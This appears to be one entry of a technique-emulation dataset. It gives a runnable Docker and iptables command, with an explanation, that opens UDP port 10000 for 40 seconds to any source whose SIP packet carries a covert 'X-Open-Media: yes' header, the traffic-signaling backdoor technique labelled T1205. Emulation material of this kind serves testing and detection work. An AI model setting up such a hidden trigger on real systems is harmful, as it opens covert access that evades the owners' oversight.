command: docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c "apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 5060 -m string --string 'X-Open-Media: yes' --algo bm -j LOG --log-prefix 'T1205_SIP_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 5060 -m string --string 'X-Open-Media: yes' --algo bm -m recent --name t1205_sip --set && iptables -I INPUT -p udp --dport 10000 -m recent --name t1205_sip --rcheck --seconds 40 --reap -j ACCEPT"
explanation: Uses a SIP header 'X-Open-Media: yes' on UDP/5060 as the signal. Matching traffic is logged and triggers a temporary allowance of UDP/10000 (RTP-like) for the source IP.
rationale_steps: From Docker, add iptables rules to monitor SIP signaling packets.
Detect an uncommon application-layer SIP header as the covert trigger.
Grant short-lived UDP/10000 access tied to the signaling source.
